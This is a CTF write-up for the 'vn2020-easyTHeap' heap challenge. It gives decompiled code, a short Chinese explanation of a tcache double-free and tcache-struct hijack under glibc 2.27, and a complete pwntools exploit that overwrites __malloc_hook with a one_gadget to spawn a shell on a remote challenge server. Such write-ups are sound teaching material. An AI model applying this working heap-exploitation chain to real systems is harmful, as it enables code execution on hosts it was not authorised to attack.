# BUU-vn2020-easyTHeap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**main**

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_A39(a1, a2, a3);
  puts("Welcome to V&N challange!");
  puts("This's a tcache heap for you.");
  while ( 1 )
  {
    sub_DCF();
    switch ( (unsigned int)sub_9EA() )
    {
      case 1u:
        if ( !add_count )//7
          exit(0);
        add();
        --add_count;
        break;
      case 2u:
        edit();
        break;
      case 3u:
        show();
        break;
      case 4u:
        if ( !free_count )//3
        {
          puts("NoNoNo!");
          exit(0);
        }
        free_();
        --free_count;
        break;
      case 5u:
        exit(0);
      default:
        puts("Please input current choice.");
        break;
    }
  }
}
```

**add**

```c
int add()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  v1 = sub_AB2();
  if ( v1 == -1 )
    return puts("Full");
  printf("size?");
  result = sub_9EA();
  v2 = result;
  if ( result > 0 && result <= 256 )
  {
    qword_202080[v1] = malloc(result);
    if ( !qword_202080[v1] )
    {
      puts("Something Wrong!");
      exit(-1);
    }
    dword_202060[v1] = v2;
    result = puts("Done!");
  }
  return result;
}
```

**show**

```c
int sub_CA4()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !*((_QWORD *)&qword_202080 + v1) )
    exit(0);
  puts(*((const char **)&qword_202080 + v1));
  return puts("Done!");
}
```

**edit**

```c
int edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !qword_202080[v1] )
    exit(0);
  printf("content:");
  read(0, (void *)qword_202080[v1], (unsigned int)dword_202060[v1]);
  return puts("Done!");
}
```

**dele**

```c
int free_()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !qword_202080[v1] )
    exit(0);
  free((void *)qword_202080[v1]);
  dword_202060[v1] = 0;
  return puts("Done!");
}
```

严格限制了add次数为7次，free次数为3次。但是没有销毁指针，只是修改了size为0。

在远程的环境中，为glibc-2.27，tcache没有对double free的检测，所以我们可以通过double free泄露堆的基址。`tcache struct`就在堆的最开始，通过计算偏移，修改tcache中chunk的fd指针，将这块内存申请出来，然后修改其count的数量，从而防止之后free的chunk进入tcache。再将这块内存进行free，它会进入`unsorted bin`中从而leak libc。

这时再进行申请，系统会将`tcache struct`进行分割，返回给我们，我们再修改其`next`指针，指向`malloc_hook`附近的`fake chunk`从而覆写get shell。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./vn_pwn_easyTHeap'

if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',26965)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.27.so',checksec=False)
#gdb.attach(sh)

def add(size):
    sh.sendlineafter(': ','1')
    sh.sendlineafter('?',str(size))
    
def edit(idx,content):
    sh.sendlineafter(': ','2')
    sh.sendlineafter('?',str(idx))
    sh.sendafter('content:',str(content))
    
def show(idx):
	sh.sendlineafter(': ','3')
 	sh.sendlineafter('?',str(idx))
  
def free(idx):
	sh.sendlineafter(': ','4')
 	sh.sendlineafter('?',str(idx))
 
one = [0x4f2c5,0x4f322,0x10a38c]
add(0x50) #0
free(0)
free(0)
#gdb.attach(sh)
show(0)
heap_base = u64(sh.recvuntil('\n', drop = True).ljust(8, '\x00'))-0x250
leak('heap base',heap_base)
add(0x50) #1
edit(1,p64(heap_base))
add(0x50) #2
add(0x50) #3
edit(3,'A'*0x28)
free(3)
show(3)

main_arena = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libcbase = main_arena-libc.sym['__malloc_hook']-0x70
fake_chunk = libcbase+libc.sym['__malloc_hook']-0x13
realloc =libcbase+libc.sym['__libc_realloc']
one_gadget = libcbase+one[1]
leak('libc base',libcbase)

add(0x50) #4 from tcache_struct
edit(4,'\x00'*0x48+p64(fake_chunk))
add(0x20) #5
edit(5,'\x00'*(0x13-8)+p64(one_gadget)+p64(realloc+8))
add(0x10)

sh.interactive()
```

